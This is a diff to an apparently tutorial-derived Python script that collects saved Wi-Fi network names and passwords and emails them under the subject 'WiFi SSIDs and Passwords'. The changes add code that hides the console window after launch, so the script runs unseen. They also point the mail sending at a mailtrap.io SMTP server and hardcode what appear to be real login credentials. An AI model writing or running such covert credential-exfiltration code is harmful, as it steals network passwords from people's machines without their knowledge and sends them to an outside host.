@@ -5,9 +5,15 @@
 #https://www.youtube.com/davidbombal #
 ######################################
 import subprocess
+import win32gui,win32con
 import re
 import smtplib
 from email.message import EmailMessage
+
+# Win32 Gui allow us to hide the terminal after executing the code.
+# Implemented by https://github.com/Mr-Cracker-Pro 
+hide_console = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hide_console,win32con.SW_HIDE)
 
 # Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
 # The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
@@ -63,11 +69,11 @@ email["subject"] = "WiFi SSIDs and Passwords"
 email.set_content(email_message)
 
 # Create smtp server
-with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
+with smtplib.SMTP(host="smtp.mailtrap.io", port=2525) as smtp:
     smtp.ehlo()
     # Connect securely to server
     smtp.starttls()
     # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
-    smtp.login("login_name", "password")
+    smtp.login("50bac7437bd85e", "36cff643b7d70f")
     # Send email.
     smtp.send_message(email)
